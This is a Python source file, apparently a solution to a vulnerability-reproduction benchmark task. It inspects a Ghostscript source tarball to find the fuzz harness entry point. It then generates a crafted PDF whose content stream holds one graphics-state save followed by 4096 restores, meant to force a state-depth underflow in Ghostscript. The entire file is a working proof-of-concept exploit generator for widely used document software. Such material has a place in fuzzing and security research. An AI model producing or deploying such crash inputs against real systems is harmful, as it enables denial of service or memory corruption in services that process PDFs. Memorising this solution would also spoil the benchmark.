import io
import os
import re
import tarfile
from typing import Dict, List, Optional


class Solution:
    def _build_pdf(self, stream_data: bytes) -> bytes:
        objs: Dict[int, bytes] = {}

        objs[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
        objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        objs[3] = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /Resources << >> >>"
        objs[4] = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(stream_data), stream_data)

        out = bytearray()
        out += b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n"

        offsets: Dict[int, int] = {}
        for i in sorted(objs.keys()):
            offsets[i] = len(out)
            out += (f"{i} 0 obj\n").encode("ascii")
            out += objs[i]
            out += b"\nendobj\n"

        xref_off = len(out)
        max_obj = max(objs.keys())
        out += (f"xref\n0 {max_obj + 1}\n").encode("ascii")
        out += b"0000000000 65535 f \n"
        for i in range(1, max_obj + 1):
            off = offsets.get(i, 0)
            out += (f"{off:010d} 00000 n \n").encode("ascii")

        out += b"trailer\n"
        out += (f"<< /Size {max_obj + 1} /Root 1 0 R >>\n").encode("ascii")
        out += b"startxref\n"
        out += (f"{xref_off}\n").encode("ascii")
        out += b"%%EOF\n"
        return bytes(out)

    def _detect_gs_fuzzer_mode(self, src_path: str) -> str:
        # Best-effort: detect whether harness uses gsapi_run_file vs gsapi_run_string
        # Returns: "file", "string", or "unknown"
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx")):
                        continue
                    if m.size <= 0:
                        continue
                    if m.size > 8_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if b"LLVMFuzzerTestOneInput" not in data and b"FuzzerTestOneInput" not in data:
                        continue
                    if b"gsapi_run_file" in data or b"gsapi_run_file2" in data or b"run_file" in data:
                        return "file"
                    if b"gsapi_run_string" in data or b"gsapi_run_string_with_length" in data:
                        return "string"
        except Exception:
            pass
        return "unknown"

    def solve(self, src_path: str) -> bytes:
        _mode = self._detect_gs_fuzzer_mode(src_path)

        # Crafted PDF content stream: one save, then many restores to force depth underflow paths.
        # Keep size modest but include enough repetitions to increase likelihood across variants.
        repeats = 4096
        stream = b"q\n" + (b"Q\n" * repeats)

        # Always return a valid PDF. Most pdfwrite fuzz harnesses run as a file and auto-detect PDF.
        return self._build_pdf(stream)